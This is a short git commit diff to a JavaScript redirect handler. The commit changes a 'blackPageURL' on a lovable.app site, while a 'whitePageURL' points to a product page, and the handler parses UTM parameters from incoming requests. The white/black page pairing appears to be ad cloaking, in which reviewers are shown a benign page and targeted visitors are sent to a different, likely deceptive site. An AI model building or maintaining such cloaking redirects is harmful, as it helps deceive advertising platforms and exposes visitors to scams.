a6bd98dba3f5ba84933ce6d9ca138a4e5a2a615b
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-18 04:23:39 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://donebydeer.com/en-dk/products/push-toy-ozzo-powder";
-    const blackPageURL = "https://casssshlov.lovable.app";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
